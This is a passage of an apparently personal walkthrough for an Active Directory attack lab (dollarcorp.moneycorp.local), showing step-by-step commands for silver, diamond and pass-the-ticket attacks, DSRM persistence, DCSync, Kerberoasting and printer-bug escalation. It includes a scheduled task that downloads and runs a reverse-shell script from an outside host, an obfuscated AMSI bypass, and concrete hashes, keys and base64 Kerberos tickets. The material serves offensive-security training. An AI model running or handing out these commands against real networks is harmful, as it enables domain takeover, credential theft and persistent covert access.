schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "sec-fortress" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/Invoke-PowerShellTcpEx.ps1''')'"

# Start scheduled task
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "sec-fortress"
```


**_Example_**


![](https://i.imgur.com/2uJ6umQ.png)

> All of this is for the `/service:HOST`, now let also look at `/service:RPCSS`

### **Craft Silver Ticket (WMI Service)**

**For accessing `WMI`, we need to create two tickets - one for `HOST` service and another for `RPCSS`.**

- Run the below commands from an elevated shell:


```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:f5a2cef076a16742b123b8ed07c372c1 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"


# Then confirm if you have access to scheduled task
schtasks /S dcorp-dc.dollarcorp.moneycorp.local
```


- Inject a ticket for `RPCSS`:

```powershell
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:f5a2cef076a16742b123b8ed07c372c1 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

- Check if the tickets are present, **_Desired Output -:_**

```powershell
klist
```

![](https://i.imgur.com/IRLpTXp.png)



- Now, try running `WMI` commands on the domain controller:


```powershell
# Spawn invisi-shell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# Run command on DC
Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
```


**_Example_**



![](https://i.imgur.com/vDOFHbG.png)



### **Executing the Diamond Ticket attack.**


> [!bug] **Learning Objective 10**
> - Use Domain Admin privileges obtained earlier to execute the Diamond Ticket attack.
> # Solution -:
 

**We can simply use the following `Rubeus` command to execute the attack. Note that the command needs to be run from an elevated shell (Run as administrator):**


```powershell
C:\AD\Tools\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# krbkey is the same as aes256_hmac
# You can use the DCsync attack to get the information
# checkout golden ticket to know more about it
```



- Access the DC using `winrs` from the new spawned process!


```powershell
winrs -r:dcorp-dc cmd
```


**_Example_**



![](https://i.imgur.com/QexYfSz.png)




### **Abusing the DSRM credential for persistence.**



> [!bug]  **Learning Objective 11**
> - During additional lab time:
> - Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.
> # Solution -:





**Note that we need Domain Admin privileges to do this,  So go ahead and spawn an elevated shell and run this to obtain a new `MS-DOS` session with domain admin privileges** -:


```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

-  run the following commands on the new `MS-DOS` session to open a PowerShell remoting session

```powershell
# load invisi-shell
powershell
cd \AD\Tools
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# load PS Remoting
$sess = New-PSSession dcorp-dc
Enter-PSSession -Session $sess

# load amsi bypass
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Exit session
exit
```




- Load the Invoke-Mimi script in the current session


```powershell
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $sess
```



- Extract credentials from the SAM file from the DC. **The Directory Services Restore Mode** (DSRM) password is mapped to the local **Administrator** on the DC


```powershell
# Connect to DC
Enter-PSSession -Session $sess

# Extract Creds
Invoke-Mimi -Command '"token::elevate" "lsadump::sam"'

# Important Output -
# User:
# Hash NTLM:
```


- change the logon behavior for the DSRM account


```powershell
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

exit
```


- Pass the Hash for the **DSRM** administrator

```powershell
 . .\Invoke-Mimi.ps1

Invoke-Mimi -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
```

- We can now access the `dcorp-dc` directly from the new session.


```powershell
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```


![](https://i.imgur.com/IRluJRE.png)



### **Enumerating Replication (DCSync) rights**


> [!bug] **Learning Objective 12**
> - Check if studentx has Replication (DCSync) rights.
> - If yes, execute the DCSync attack to pull hashes of the krbtgt user.
> - If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.
> # Solution -:



- Check if `studentx` has replication rights (Run from an elevated command prompt) -

```powershell
# Load invisi-shell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# Load Powerview
. C:\AD\Tools\PowerView.ps1

# check rights
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}
```

> If you probably don't get any output then you don't have replication rights, we can go ahead and add them by ourself


- Start a process as Domain Administrator (Run from an elevated command prompt)

```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```


- Run the below commands in the new process. Remember to change `studentx` to your user


```powershell
# Load invisi-shell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# Load powerview
. C:\AD\Tools\PowerView.ps1

# Add rights
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentx -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```


![](https://i.imgur.com/ypwVnJz.png)

- Let’s check for the rights once again from a normal shell

```powershell
# Load invisi-shell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# Load Powerview
. C:\AD\Tools\PowerView.ps1

# check rights
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}
```


- Your Output should look like this


```powershell
AceQualifier           : AccessAllowed
ObjectDN               : DC=dollarcorp,DC=moneycorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-719815819-3726368948-3917688648
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-719815819-3726368948-3917688648-4105
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : dcorp\student505

AceQualifier           : AccessAllowed
ObjectDN               : DC=dollarcorp,DC=moneycorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-719815819-3726368948-3917688648
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-719815819-3726368948-3917688648-4105
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : dcorp\student505

AceQualifier           : AccessAllowed
ObjectDN               : DC=dollarcorp,DC=moneycorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-All
ObjectSID              : S-1-5-21-719815819-3726368948-3917688648
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-719815819-3726368948-3917688648-4105
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : dcorp\student505
```



- Sweet! Now, below command (or any similar tool) can be used as `studentx` to get the hashes of krbtgt user or any other user, (Run from an elevated command prompt)


```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```



> [!bug] **Learning Objective 13**
> - Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.
> - Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.
> # Solution -:


### **PowerShell Remoting and WMI Access via Security Descriptor Modification on dcorp-dc**


**Once we have administrative privileges on a machine, we can modify security descriptors of services to access the services without administrative privileges. Below command (to be run as Domain Administrator) modifies the host security descriptors for `WMI` on the DC to allow `studentx` access to `WMI`**

- Start a process as domain admin

```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```


- On the new spawned process run this


```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\RACE.ps1

# Modify security descriptor
Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```



- Now, we can execute `WMI` queries on the DC as `studentx` (spawn a new powershell process) -

```powershell
powershell

gwmi -class win32_operatingsystem -ComputerName dcorp-dc
```


![](https://i.imgur.com/FmYDwF2.png)



### **Silver Ticket Attack via Machine Account Hash in dcorp-dc**


- Start a process as domain admin

```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```


- To retrieve machine account hash without DA, first we need to modify permissions on the DC. On the new spawned process run this -:


```powershell
powershell

. C:\AD\Tools\RACE.ps1

# retrieve machine account hash
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee studentx -Verbose
```


![](https://i.imgur.com/83LGb7O.png)



- Now, we can retrieve hash as `studentx` (Spawn a new powershell process) -


```powershell
. C:\AD\Tools\RACE.ps1

Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```


![](https://i.imgur.com/uHQje6w.png)


**We can then generate Silver Tickets for HOST and RPCSS with the machine account hash, enabling WMI query execution**


```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:f5a2cef076a16742b123b8ed07c372c1 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```


```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:f5a2cef076a16742b123b8ed07c372c1 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```


- Run the below command for `WMI` query execution


```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

gwmi -Class win32_operatingsystem -ComputerName dcorp-dc
```


![](https://i.imgur.com/JU363Qh.png)



# **Domain Privilege Escalation**

> [!bug] Learning Objective 14
>  - Using the Kerberoast attack, crack password of a SQL server service account.
># Solution -:

### **Kerberoast Attack - Crack SQL Server Service Account Password**


- Identify Services Running with User Accounts for Easier Password Cracking using `PowerView` -

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\PowerView.ps1

Get-DomainUser -SPN

# Important Output -:
# samaccountname
# serviceprincipalname
```


![](https://i.imgur.com/yi9qbOd.png)



**Neat! The `svcadmin`, which is a domain administrator has a SPN set! Let's Kerberoast it!**


- Retrieve Hashes for `svcadmin` Account with `Rubeus`, Focusing on **RC4**-Supported Accounts to Bypass AES Encryption (Run Command from elevated prompt)


```powershell
C:\AD\Tools\Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```


![](https://i.imgur.com/JHhSzlr.png)




> **You should now have your hashes written to `C:\AD\Tools\hashes.txt`, We can now use John the Ripper to brute-force the hashes. Please note that you need to remove "`:1433`" from the SPN in `hashes.txt` before running John**




![](https://i.imgur.com/uxUMZQg.png)


- We can then run the below command after making above changes -:


```powershell
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```


![](https://i.imgur.com/VsPwFaB.png)



> [!bug] Learning Objective 15
> - Find a server in the dcorp domain where Unconstrained Delegation is enabled.
> - Compromise the server and escalate to Domain Admin privileges.
> - Escalate to Enterprise Admins privileges by abusing Printer Bug!
> # Solution -:




### **Locate `dcorp` Domain Server with Unconstrained Delegation Enabled.**


- Find server with unconstrained delegation


```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat 

. C:\AD\Tools\PowerView.ps1 

Get-DomainComputer -Unconstrained | select -ExpandProperty name
```


![](https://i.imgur.com/X1AveOc.png)


> **Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on `appsrv`. Recall that we extracted secrets of `appadmin`, `srvadmin` and `websvc` from `dcorp-adminsrv`. Let’s check if anyone of them have local admin privileges on `dcorp-appsrv`.**




- First, we will try with `appadmin`. Run the below command from an elevated command prompt -:


```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:appadmin /domain:dollarcorp.moneycorp.local /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /run:cmd.exe" "exit"
```


- Run the below commands in the new process:


```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat 

. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1 

Find-PSRemotingLocalAdminAccess
```



![](https://i.imgur.com/vsiDSok.png)



### **Exploit Printer Bug for Escalation to Enterprise Admins Privileges**



- Run the below command from the new process running `appadmin` -:

```powershell
echo F | xcopy C:\AD\Tools\Rubeus.exe \\dcorp-appsrv\C$\Users\Public\Rubeus.exe /Y
```


![](https://i.imgur.com/6ZZeoLg.png)


- Run `Rubeus` in listener mode

```powershell
winrs -r:dcorp-appsrv cmd


C:\Users\Public\Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```


- Force Authentication from` dcorp-dc$` on Student VM Using MS-RPRN. (make sure to start up a new process on your student machine)


```powershell
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```


![](https://i.imgur.com/IKPDwpG.png)


- On the `Rubeus` listener, we can see the TGT of `dcorp-dc$` (Output):


```
# Important Output
# User :
# Base64EncodedTicket :


[*] Monitoring every 5 seconds for new TGTs


[*] 12/18/2023 9:34:26 PM UTC - Found new TGT:

  User                  :  DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL
  StartTime             :  12/18/2023 5:51:15 AM
  EndTime               :  12/18/2023 3:51:15 PM
  RenewTill             :  12/24/2023 8:17:13 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    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

[*] Ticket cache size: 1
```



![](https://i.imgur.com/xfekzWb.png)



- Copy the base64 encoded ticket and Use Rubeus with Base64 Encoded Ticket on Student VM for SafetyKatz DCSync Command (Run the below command from an elevated prompt) -:


```powershell
# C:\AD\Tools\Rubeus.exe ptt /ticket:<Base64EncodedTicket>
# Example -:


C:\AD\Tools\Rubeus.exe ptt /ticket:doIGRTCCBkGgAwIBBaEDAgEWooIFGjCCBRZhggUSMIIFDqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBLYwggSyoAMCARKhAwIBAqKCBKQEggSgBicEI7irj3M4XWj9UJcHMQxVP4AUxlDOT7IjYkBSUoR/qySCuEhZS2S4i/z4jo1aedUT61KFX8zk4hEYwWv0lHNuKFWM8UzV2cnzLl/22xgkv23jcu/d8vYUK5eq28ndefHA4vIqlBu4pEffYgX9uVHcWkBdYT6FbXWxC8Zhr7c1LN9QmHXVOHmnpJ0+0TMjm+TlhbGRjPjZpUF42NG+Y3021z94gCL06oboayxzjl1nMNIqhzOKhnDZgZ8tLtSbgjs5d5K4cwbUn6rxbN36Z7OorS9ydZB/K+HAUs6ICVY/C267sBY0+JyoeY54FHDMQ2X3ouD8Llkoeh1tb7l2LaDfhP7E4bpdxat3GDk13IOQDk2ccIEWcDrN5x2sti23q9j7ragMmGpz0OYDerXlhMfwbCeoDfubtOC0L3qxy6GBTcXrpBKnx9MXS2++k/igQV7suV/Upcw1jLbanmvTY4CmjUPX/1InHiEfOwm39+NvBAyc0eSE33zfbvPSCI2eWcFe4CUD8z79u0c+E2ic1lkCwNesEv9dGzFCQmgMiyNj3kXnvbiiEpWT3nDCVi23n7kgDX3LTeSjiW4WOlQFR9Fh02MN2XaYRccGhhzCFfuX3y6pLwMBlsEiVBwQ/s4sbUVxM+ABENjWKrS/LOXVudHioJN1+yOD2UNioXwWB06H2vby6Y0GUqD+5qjrRdcOJgL6AJAe6vNUWIOt2XoHn+PM0wRfR8yYMmcFZem2F5xnnwCia7kcBBNBBReP1herUMKxJ9OHkWkqpR9BrU7bwbot3Mid2AN8Ye4L4G7Bq/PnVL6OcCoDL9cDj1iS505KtIQDqTOuPfbsF0BwBQ6rgmLmL4h5HPt1b5NVXms2Tslr+/pqaeI0yw3byFytbBRaOsfiuwFTZDLOJK9AqwxQs73DR3QskYbmpDC4PoCnxcDuEjds4VxMXSPTAov7S5tH+WJdxihF1z8wwdxX/FONT4YEoWMop/Nw3aKyGPAsbLjPNypyeHmqJymwIRLS5IgEeqPjbk/A6NgVizWSYbZivN/WONi3uaOM4POkzcibz4Q7vrZ1xR3oI3Rcgc5wB91EUUrLVL1tAut+vIVNxFLdT07avtbo1i8zQGdZX7N2RUHXuZcpuN7bjEFeHU8TxySagliLO9Ft4uVB0yKI2JLiHrFj0icNWfw9ICXB1ZLzHKFs+BV0LQSNwAnc7z4D/aV/PrzODgTFYZREm4FZ9xhXWCP1XKRjz8CD2g8d8xCarQ+8RZVCWSMTNXL1mkc6ZchXo1G7d+zvQK0SeLuXgAtCQaO83uJScA+DHMqwU3tepy2gy3luVxm+u6qtzuToekhRJfABRLd0bJhn1Yg91AIxRXd8JNa5LVlWSgATTaFAIP8l67EPsRNkyihhMu5c6ayTJXtB1xa4LjL2CbTvOUWOr6r8YAVzIM+tHYCW9rln2/P4nb97LzHJLQIuSc0gl42aGlGtFicoRaKyrrZ+QnKxXriQKSowtHzsOr0wW2oxAKOBGGX8758l6DCjlomDRD7Yj8Xt7auTq9pg4DDq7ALxuCp6DZeXmd9b2gpC0IcwpLyjggEVMIIBEaADAgEAooIBCASCAQR9ggEAMIH9oIH6MIH3MIH0oCswKaADAgESoSIEIH248sJljTsDzcA4yXD/lnOBTU5WHZCAqFMy5VBSDb7PoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMohYwFKADAgEBoQ0wCxsJRENPUlAtREMkowcDBQBgoQAApREYDzIwMjMxMjE4MTM1MTE1WqYRGA8yMDIzMTIxODIzNTExNVqnERgPMjAyMzEyMjUwNDE3MTNaqBwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqS8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTA==
```


![](https://i.imgur.com/BT3kcjj.png)



- Now, we can run `DCSync` from this process:


```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```


### **Escalation to Enterprise Admins**

- To get Enterprise Admin privileges, we need to force authentication from `mcorp-dc`. Run the below command to listen for `mcorp-dc$` tickets on `dcorp-appsrv`:

```powershell
winrs -r:dcorp-appsrv cmd

C:\Users\Public\Rubeus.exe monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
```

> **Note -:** Incase you get "access is denied", you are probably running in the wrong shell, so just terminate the `Rubeus` listener we created then and run in that process



![](https://i.imgur.com/NhLQfn8.png)



- Use `MS-RPRN` on the student VM to trigger authentication from `mcorp-dc` to `dcorp-appsrv`:


```powershell
C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local

# Expected Output -
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.
```

- Now check your `Rubeus` output and you should see the **Base64EncodedTicket**
- Utilize `Rubeus` with **Base64 Encoded Ticket** on Student VM to Execute Elevated `SafetyKatz` DCSync Command. (Rub below command from elevated shell)


```powershell
# C:\AD\Tools\Rubeus.exe ptt /ticket:<Base64EncodedTicket>
# Example -:


C:\AD\Tools\Rubeus.exe ptt /ticket:doIF1jCCBdKgAwIBBaEDAgEWooIE0TCCBM1hggTJMIIExaADAgEFoREbD01PTkVZQ09SUC5MT0NBTKIkMCKgAwIBAqEbMBkbBmtyYnRndBsPTU9ORVlDT1JQLkxPQ0FMo4IEgzCCBH+gAwIBEqEDAgECooIEcQSCBG0zsEcixo1JCHbZbP82zobSQJjNPPUW2dL6en0nms/Mvn0IQw00f5sejRrVK167onrNxTy3j+uATLdX6afEzsv1ziTW11OBaIUirl3Ro0DVayVkPMU62sicmmLSGA0JbJkHsXTSV2us7SX1B37i6EfKNUAW24EPzjlJSn5uyT3DcMy3r8PRY1N1xI9ev1A0QKqS9VG0oAnl4vcCJpEnNvg5r8wmzc87J4ooAXe/MpGwkEvsUxQ2NNrdiBsRX404gI4OraaXMFqreHwQ0XNOCs/xciAszBh688g6I90OBin+a+Abfl34ZZL8JG81JVUtXKk1M4wFqTYg+ldc7A5VkwlKcN6bwFgT4B0M6IR3IfSx9eAXA5IXwrrD1M0idilE1YWiP8kmxLtxLZyKEO8I5fLMcfYh3BykS6kFs1/ysqVYeDP0wuidTZnhK3RsFIO6G/+EOWtF1VROEalqKUuGc9gSMoZ/OUS2mSYLhZhobmoa3bsqLKYBILTfVjHLu8QdUchJgu1cW5edi3WNrLnqsac+1nXt8OKeBVuAEmUZKsjT/9aIBor8R12GBElZwEbA7aRSIYJ0jqJAbGBZf1o4Z+jzEucVUFJwbWe2YJxX2VF4EKjXTt8+hcxBS6S0TaDmMJOQqHVYjoT1HR6T+BURHbIQkKVd4Gd60iA17sm2NYZFFF5pjmUcBHE7OaULUtiZXNUYZ1o210WsyaxFT1f5LjsDmWNDVuj/UdQHB71iouNxNc/eofavPC/QstZJ95fIYKuQa5nB9MIYrNvvF97Hn1M5Q258XxQ4kYThL3YgCJyGbdOu1ac/LgcHv8MBrH7kt6IZDF/2hzqVfVwBOVSYTY+lNv6OJLMIJcUNdjc5gGJVugYJPl5IjvzqxCiF9jWcjuP2n/cuPlwUjjzGSOkopT5CL6wrBpzvndJDbuWve4+5u5xTNaEdMLFIZIFnIxLzoI8vOab1dMYN+g06D7P6qnAqtOPih3sfLl14qV7yYcApG3+2a2CZ4XFxseK+TQposFSc0XDH+WThwMRb91KGyNwhQxQDAJdq0AockvMItW3Za5OJQEMzDsbsADDcjIecNfW6RQQa1bgHBPQomuF400AYTjhX9k4VEGy5JuUUH2ZeGB6BO+7cX5TAyqFPtQ8vlCQ6XGp3ceSarp1/gMpB1jNyxz33vMEcRd43Rs2d+tXIuz0kunqs5x5Sf0R0C9dyd/KoD39+Zjp+hO2bHoLj9JHluuxNAxBobaAJL4wcRomm2lQn/+n6O7lqGYKg5jyPMdck91/twHuOSBqrPuYC9NJjK+vOJ2NHQAjd8jgOBnCOW1aQKkFCk3GbD+eeA9wnKFqhqQ+lvqnY5aym